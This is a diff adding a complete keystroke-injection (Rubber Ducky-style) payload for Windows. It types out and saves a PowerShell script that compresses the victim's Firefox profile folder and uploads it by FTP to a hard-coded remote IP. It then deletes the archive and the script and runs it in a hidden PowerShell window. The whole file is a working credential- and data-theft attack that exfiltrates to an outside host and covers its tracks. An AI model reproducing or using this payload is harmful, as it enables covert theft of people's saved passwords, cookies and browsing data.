@@ -1,0 +1,47 @@
+DELAY 1000
+GUI r
+DELAY 1200
+STRING notepad.exe 
+ENTER
+DELAY 1800
+STRING Compress-Archive -Path "$($env:LOCALAPPDATA)\Mozilla\Firefox\Profiles\" -CompressionLevel "Fastest" -DestinationPath "$($env:TEMP)\ff.zip"
+DELAY 200
+ENTER
+STRING $client = New-Object System.Net.WebClient
+DELAY 200
+ENTER
+STRING $client.Credentials = New-Object System.Net.NetworkCredential("USERNAME", "PASSWORD")
+DELAY 200
+ENTER
+STRING $client.UploadFile("ftp://192.168.111.222/ff.zip", "$($env:TEMP)\ff.zip")
+DELAY 200
+ENTER
+STRING rm "$($env:TEMP)\ff.zip"
+DELAY 200
+ENTER
+STRING rm "$($env:TEMP)\e.ps1"
+DELAY 200
+ENTER
+CTRL s
+DELAY 1000
+STRING %TEMP%\e.ps1
+DELAY 200
+TAB
+DELAY 200
+DOWN
+DELAY 200
+DOWN
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 500
+ALT F4
+DELAY 500
+GUI r
+DELAY 1200
+STRING powershell.exe -windowstyle Hidden %TEMP%\e.ps1
+DELAY 200
+ENTER
+
+
